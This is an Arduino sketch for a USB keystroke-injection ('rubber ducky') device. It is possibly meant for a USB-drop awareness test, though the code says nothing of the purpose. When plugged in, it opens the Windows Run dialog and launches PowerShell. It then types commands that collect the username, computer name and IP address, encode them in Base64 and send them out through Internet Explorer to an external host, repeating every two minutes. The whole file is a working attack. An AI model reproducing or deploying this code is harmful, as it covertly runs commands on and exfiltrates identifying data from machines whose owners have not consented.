#include <Keyboard.h>

// Random ID so we can identify our ducky in a later stage. Enter anything. 
// Just be sure to change this value before uploading to your stick
String MYID = "123";  

 // variable
long loopdelay = 10000;

void setup() {
  Serial.begin(9600);      
  Keyboard.begin();
}

void betterPrintln(String line, int mydelay = 20, bool pressEnter = false) {
  Serial.println("Keyboard emulating: " + line);
  Keyboard.println(line);
  if(pressEnter) {
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
  }
  delay(mydelay);  
}

void loop() {         
  if(loopdelay > 0) {
    Serial.println("Waiting for : " + loopdelay);
    delay(loopdelay);
  } else { 
    Serial.println(loopdelay);
  }
  // Open the Windows executor gui screen
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(50); 
  Keyboard.releaseAll();
  delay(20);
  // Enter "powershell" and execute
  betterPrintln("powershell", 500, true);

  // Run our powershell script        
  betterPrintln("$var = \" ducky" + MYID +";\" + $env:USERNAME + \" ;\" + $env:COMPUTERNAME + \" ;\" ;");
  betterPrintln("$ip = Test-Connection -ComputerName $env:COMPUTERNAME -Count 1  | Select IPV4Address ;");
  betterPrintln("$var += $ip.IPV4Address.IPAddressToString ;");
  betterPrintln("$var = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($var)) ;");
  betterPrintln("$var = $var.replace('B', '_') ;");
  betterPrintln("$IE=new-object -com internetexplorer.application ;");
  betterPrintln("$IE.navigate2(\" https://www.qaulogy.com/ducky/ducky/\" + $var) ;");
  betterPrintln("$IE.visible=$true ;", 30, true);
  betterPrintln("exit", 50, true);
  loopdelay = 120000;
} 

